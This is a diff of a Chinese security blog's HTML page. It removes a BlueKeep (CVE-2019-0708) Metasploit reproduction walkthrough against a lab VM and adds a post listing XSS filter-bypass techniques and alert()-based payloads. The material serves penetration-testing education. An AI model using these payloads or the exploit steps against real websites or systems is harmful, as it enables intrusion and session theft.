@@ -72,30 +72,20 @@
     })();
 </script>
 
-  <meta name="description" content="BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。">
-<meta name="keywords" content="CVE">
+  <meta name="description" content="XSS绕过常规姿势+payload">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2019-0708复现">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;index.html">
+<meta property="og:title" content="XSS绕过常规姿势 + payload">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;12&#x2F;12&#x2F;XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload&#x2F;index.html">
 <meta property="og:site_name" content="Jokong的博客">
-<meta property="og:description" content="BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。">
+<meta property="og:description" content="XSS绕过常规姿势+payload">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;1.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;2.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;3.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;4.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;5.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;6.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;7.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;8.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;9.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;10.jpg">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;11.jpg">
-<meta property="og:updated_time" content="2020-01-10T00:36:12.382Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;12&#x2F;12&#x2F;XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;12&#x2F;12&#x2F;XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload&#x2F;2.png">
+<meta property="og:updated_time" content="2021-12-12T05:45:28.738Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;CVE-2019-0708%E5%A4%8D%E7%8E%B0&#x2F;1.jpg">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;12&#x2F;12&#x2F;XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload&#x2F;1.png">
 
-<link rel="canonical" href="http://yoursite.com/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/">
+<link rel="canonical" href="http://yoursite.com/2021/12/12/XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload/">
 
 
 <script id="page-configurations">
@@ -109,7 +99,7 @@
   };
 </script>
 
-  <title>CVE-2019-0708复现 | Jokong的博客</title>
+  <title>XSS绕过常规姿势 + payload | Jokong的博客</title>
   
 
 
@@ -255,7 +245,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/12/XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/touxiang.jpg">
@@ -268,7 +258,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          CVE-2019-0708复现
+          XSS绕过常规姿势 + payload
         </h1>
 
         <div class="post-meta">
@@ -277,24 +267,18 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2019-11-27 11:38:10" itemprop="dateCreated datePublished" datetime="2019-11-27T11:38:10+08:00">2019-11-27</time>
+              <time title="创建时间：2021-12-12 12:16:04 / 修改时间：13:45:28" itemprop="dateCreated datePublished" datetime="2021-12-12T12:16:04+08:00">2021-12-12</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-01-10 08:36:12" itemprop="dateModified" datetime="2020-01-10T08:36:12+08:00">2020-01-10</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞复现</span>
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
                   </a>
                 </span>
             </span>
@@ -308,32 +292,20 @@
               <span id="busuanzi_value_page_pv"></span>
             </span>
   
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/#comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
   <br>
             <span class="post-meta-item" title="本文字数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>2.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -345,26 +317,40 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。</p>
+        <p>XSS绕过常规姿势+payload</p>
 <a id="more"></a>
 
-
-<h3 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h3><p>目标机：Windows 2007 X64    192.168.30.129<br>攻击机：kali    192.168.30.128</p>
-<p>windows配置<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/1.jpg" alt="1"></p>
-<p>kali 配置 - MSF下替换文件<br>EXP下载地址：<a href="https://github.com/backlion/demo/blob/master/CVE-2019-0708_RDP%20_MSF.zip" target="_blank" rel="noopener">https://github.com/backlion/demo/blob/master/CVE-2019-0708_RDP%20_MSF.zip</a>  </p>
-<p>cve_2019_0708_bluekeep_rce.rb 添加 /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb  </p>
-<p>rdp.rb 替换 /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb<br>rdp_scanner.rb 替换 /usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb  </p>
-<p>cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb  </p>
-<p>root@kali:~# msfconsole<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/2.jpg" alt="2"></p>
-<p>msf5 &gt; reload_all    #重新加载所有模块<br>msf5 &gt; search cve_2019_0708<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/3.jpg" alt="3"></p>
-<p>msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; info<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/4.jpg" alt="4"></p>
-<p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;set RHOSTS 192.168.30.129<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/5.jpg" alt="5"></p>
-<p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;set target 3<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/6.jpg" alt="6"></p>
-<p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;show options<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/7.jpg" alt="7"></p>
-<p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;run<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/8.jpg" alt="8"></p>
-<p>执行whoami<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/9.jpg" alt="9"></p>
-<h3 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h3><p>这种情况是把虚拟机打蓝屏了，此时，关机重启，多试几次。哈哈哈哈哈！（鬼知道我打蓝屏了多少次）<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/10.jpg" alt="10"><br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/11.jpg" alt="11"></p>
-<p>修复建议：<br>安装微软为2019-0708推出的专用补丁：<br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708</a></p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h4><p>在我们的单引号之前放置了一个“\”，有时候双引号之前也会放置，通<br>过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT type=&quot;text&quot; value=&apos;\&apos;&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCRIPT&gt;&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html<br>的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，<br>因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。<br>    &#34;    &quot;    “    双引号<br>    &#38;    &amp;    &amp;    &amp;符号<br>    &#60;    &lt;    &lt;    小于号<br>    &#62;    &gt;    &gt;    大于号<br>使用<code>&amp;quot</code>;或者<code>&amp;#34</code>;<br>来代替我们的双引号，有时候可以绕过过滤</p>
+<p><strong>例子:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>如果这都被过滤了。那我们可以使用 JavaScript 的 fromCharCode 函数，这个函数把指定的 Unicode值转换成字符串</p>
+<p><strong>例子</strong></p>
+<pre><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code></pre><h4 id="lt-SCRIPT-gt-过滤绕过"><a href="#lt-SCRIPT-gt-过滤绕过" class="headerlink" title="&lt;SCRIPT&gt;过滤绕过"></a><code>&lt;SCRIPT&gt;</code>过滤绕过</h4><p>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。</p>
+<pre><code>&lt;BODY onload=&quot;alert(&apos;XSS&apos;)&quot;&gt;</code></pre><p>在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。</p>
+<pre><code>&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;
+&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;</code></pre><p>注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用<code>&lt;script&gt;</code><br>标签哦。</p>
+<p>如果是把<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>标签过滤掉，那么可以用</p>
+<pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</code></pre><h4 id="Input-标签属性绕过"><a href="#Input-标签属性绕过" class="headerlink" title="(Input)标签属性绕过"></a>(Input)标签属性绕过</h4><pre><code>&lt;INPUT type=&quot;text&quot; value=&apos;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;&gt;</code></pre><p><strong>闭合<code>&lt;input&gt;</code></strong></p>
+<pre><code>&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</code></pre><p>现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。</p>
+<pre><code>&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;</code></pre><p>所有的输入就会变成这样：</p>
+<pre><code>&lt;INPUT type=&quot;text&quot; value=&apos;&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;&apos;&gt;</code></pre><p>Javascript 代码就注入了。<code>&lt;xss a=”&gt;</code>这个没什么意义，你可以自己改，但是符合 html 的标准，<br>页面不会出错。</p>
+<h4 id="大小写混用绕过"><a href="#大小写混用绕过" class="headerlink" title="大小写混用绕过"></a>大小写混用绕过</h4><pre><code>&lt;iMgSRC = &quot;JavaScript:alert(0);&quot;&gt;</code></pre><p>不使用引号或者构造全角字符也能扰乱过滤规则</p>
+<p>还有像CSS中/**/会被浏览器忽略，\和\0同样或被浏览器忽略，同样可以用来绕过：</p>
+<pre><code>&lt;img src =&quot;java/*javascript:alert(‘xss‘)*/script:alert(1);&quot;&gt;</code></pre><h4 id="magic-quotes-gpc绕过"><a href="#magic-quotes-gpc绕过" class="headerlink" title="magic_quotes_gpc绕过"></a><code>magic_quotes_gpc</code>绕过</h4><pre><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;</code></pre><h4 id="分号引号过滤绕过"><a href="#分号引号过滤绕过" class="headerlink" title="分号引号过滤绕过"></a>分号引号过滤绕过</h4><pre><code>&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</code></pre><h4 id="括号被过滤绕过"><a href="#括号被过滤绕过" class="headerlink" title="括号被过滤绕过"></a>括号被过滤绕过</h4><p>当括号被过滤的时候可以使用throw来绕过</p>
+<pre><code>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;
+&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</code></pre><p>以上两个测试向量在Chrome跟IE在上面会出现一个“uncaught”的错误，可以用以下的向量：</p>
+<pre><code>&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;</code></pre><h4 id="被过滤时绕过"><a href="#被过滤时绕过" class="headerlink" title="= ( ) ; :被过滤时绕过"></a>= ( ) ; :被过滤时绕过</h4><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;// 通杀所有浏览器</code></pre><p>opera中可以不闭合</p>
+<pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 // Opera可查</code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><strong>js中的三种弹框分别是alert()，confirm()，prompt()</strong></p>
+<pre><code>十进制值                           URL编码                              介绍            
+  47                                %2F                                正斜杠            
+  13                                %0D                                回车            
+  12                                %0C                                分页符            
+  10                                %0A                                换行            
+  9                                  %09                               水平制表符            </code></pre><p><img src="/2021/12/12/XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload/1.png" alt="1"></p>
+<p><img src="/2021/12/12/XSS%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%84%E5%A7%BF%E5%8A%BF-payload/2.png" alt="1"></p>
 
     </div>
 
@@ -372,37 +358,22 @@
     
     
       
-  <div class="popular-posts-header">推荐文章</div>
-  <ul class="popular-posts">
-    <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="\2021\12\12\Grafana-未授权任意文件读取\" rel="bookmark">Grafana 未授权任意文件读取</a></div>
-    </li>
-    <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="\2019\11\27\Harbor任意管理员注册漏洞-CVE-2019-16097-复现\" rel="bookmark">Harbor任意管理员注册漏洞(CVE-2019-16097)复现</a></div>
-    </li>
-  </ul>
 
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CVE/" rel="tag"># CVE</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
-                <a href="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/" rel="next" title="Harbor任意管理员注册漏洞(CVE-2019-16097)复现">
-                  <i class="fa fa-chevron-left"></i> Harbor任意管理员注册漏洞(CVE-2019-16097)复现
+                <a href="/2021/12/12/Grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="next" title="Grafana 未授权任意文件读取">
+                  <i class="fa fa-chevron-left"></i> Grafana 未授权任意文件读取
                 </a>
             </div>
 
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-                <a href="/2020/01/10/%E6%88%91%E7%9A%842019/" rel="prev" title="我的2019">
-                  我的2019 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
       </footer>
@@ -417,7 +388,6 @@
 
           </div>
           
-    <div class="comments" id="comments"></div>
 
         </div>
           
@@ -442,7 +412,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#复现过程："><span class="nav-number">1.</span> <span class="nav-text">复现过程：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#遇到的坑"><span class="nav-number">2.</span> <span class="nav-text">遇到的坑</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">1.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#单引号过滤绕过"><span class="nav-number">1.1.</span> <span class="nav-text">单引号过滤绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-SCRIPT-gt-过滤绕过"><span class="nav-number">1.2.</span> <span class="nav-text">&lt;SCRIPT&gt;过滤绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Input-标签属性绕过"><span class="nav-number">1.3.</span> <span class="nav-text">(Input)标签属性绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#大小写混用绕过"><span class="nav-number">1.4.</span> <span class="nav-text">大小写混用绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#magic-quotes-gpc绕过"><span class="nav-number">1.5.</span> <span class="nav-text">magic_quotes_gpc绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分号引号过滤绕过"><span class="nav-number">1.6.</span> <span class="nav-text">分号引号过滤绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#括号被过滤绕过"><span class="nav-number">1.7.</span> <span class="nav-text">括号被过滤绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#被过滤时绕过"><span class="nav-number">1.8.</span> <span class="nav-text">= ( ) ; :被过滤时绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">2.</span> <span class="nav-text">payload</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
